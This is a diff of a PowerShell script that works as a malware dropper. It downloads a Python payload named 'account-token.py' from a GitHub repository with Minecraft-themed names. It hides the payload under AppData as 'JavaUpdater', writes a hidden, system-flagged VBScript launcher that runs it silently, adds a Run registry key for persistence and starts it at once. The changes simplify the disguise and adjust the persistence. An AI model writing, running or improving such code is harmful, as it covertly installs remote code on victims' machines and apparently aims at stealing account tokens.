@@ -4,10 +4,9 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
+# Simplified Path: No CLSID, just a hidden folder in AppData
 $GITHUB_RAW_URL = "https://raw.githubusercontent.com/get-activated/com.mojang.minecraft/refs/heads/main/account-token.py"
-$BaseDir = "$env:APPDATA\Microsoft\SystemHealth"
-$CLSID = ".{e2110112-612b-4750-ad30-75611c619e64}"
-$InstallDir = "$BaseDir$CLSID"
+$InstallDir = "$env:APPDATA\Microsoft\JavaUpdater"
 $AgentPath = "$InstallDir\win_sys_host.pyw"
 $PythonPath = "$InstallDir\bin"
 
@@ -40,18 +39,20 @@ if (-not $pythonInstalled) {
 # --- Download Payload ---
 Invoke-WebRequest -Uri $GITHUB_RAW_URL -OutFile $AgentPath -UseBasicParsing
 
-# --- Fixed VBScript Launcher ---
+# --- FIXED VBScript Launcher ---
+# We use [char]34 to build the quotes to prevent "Unterminated string" errors
 $vbsLauncher = "$InstallDir\launcher.vbs"
-$q = [char]34  # This is a literal double-quote "
-$vbsContent = "Set WshShell = CreateObject($q" + "WScript.Shell" + "$q)" + "`n" + "WshShell.Run $q$pythonwExe$q & " + "$q $AgentPath$q" + ", 0, False"
+$q = [char]34 
+$vbsLine1 = "Set WshShell = CreateObject(" + $q + "WScript.Shell" + $q + ")"
+$vbsLine2 = "WshShell.Run " + $q + $q + $pythonwExe + $q + " " + $q + $AgentPath + $q + $q + ", 0, False"
+$vbsContent = $vbsLine1 + "`n" + $vbsLine2
+
 Set-Content -Path $vbsLauncher -Value $vbsContent -Encoding ASCII
+attrib +h +s $vbsLauncher
 
 # --- Persistence ---
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $RegPath -Name "SystemHealthManager" -Value "wscript.exe $q$vbsLauncher$q" -Force
-
-$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "$q$vbsLauncher$q"
-Register-ScheduledTask -TaskName "SystemHealthUpdate" -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest) -Force | Out-Null
+Set-ItemProperty -Path $RegPath -Name "JavaUpdateManager" -Value "wscript.exe $q$vbsLauncher$q" -Force
 
 # --- Run it now ---
 Start-Process "wscript.exe" -ArgumentList "$q$vbsLauncher$q"
